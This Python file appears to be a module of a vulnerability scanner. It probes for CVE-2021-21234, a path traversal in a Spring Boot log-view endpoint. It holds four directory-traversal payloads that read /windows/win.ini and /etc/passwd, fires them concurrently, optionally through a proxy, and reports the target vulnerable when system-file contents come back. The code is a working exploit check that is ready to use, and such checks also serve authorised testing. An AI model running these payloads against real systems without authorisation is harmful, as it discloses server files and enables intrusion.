# coding:utf-8

import aiohttp
import asyncio

from util.Translate import tr

class CVE_2021_21234_Async:
    def __init__(self):
        self.payload1 = 'manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
        self.payload2 = 'log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
        self.payload3 = 'manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
        self.payload4 = 'log/view?filename=/etc/passwd&base=../../../../../../../../../../'

    async def fetch(self, session, url, payload, proxies):
        try:
            async with session.post(url=url + payload, verify_ssl=False, proxy=proxies) as response:
                return await response.text()
        except Exception as e:
            return str(e)

    async def poc(self, url, proxies, ProxyStute):
        if ProxyStute == 1:
            proxy = proxies
        else:
            proxy = None

        try:
            async with aiohttp.ClientSession() as session:
                tasks = [
                    self.fetch(session, url, self.payload1, proxy),
                    self.fetch(session, url, self.payload2, proxy),
                    self.fetch(session, url, self.payload3, proxy),
                    self.fetch(session, url, self.payload4, proxy),
                ]

                responses = await asyncio.gather(*tasks)

                if any('MAPI' in str(resp) for resp in responses[:2]):
                    result = tr("v.21234.win")
                    result1 = f"{url + self.payload1}\n"
                    result2 = f"{url + self.payload2}"
                    return result + result1 + result2
                elif any('root:x:' in str(resp) for resp in responses[2:]):
                    result = tr("v.21234.linux")
                    result1 = f"{url + self.payload3}\n"
                    result2 = f"{url + self.payload4}"
                    return result + result1 + result2
                else:
                    result = tr("v.21234.none", url=url)
                    return result
        except Exception as e:
            error = tr("v.unknown", url=url, e=e)
            return error
    async def exp(self, url, proxies, ProxyStute):
        pass
if __name__ == "__main__":
    url = "http://127.0.0.1:8081"
    cve_checker = CVE_2021_21234_Async()
    result = asyncio.run(cve_checker.poc(url, proxies=None, ProxyStute=0))
    print(result)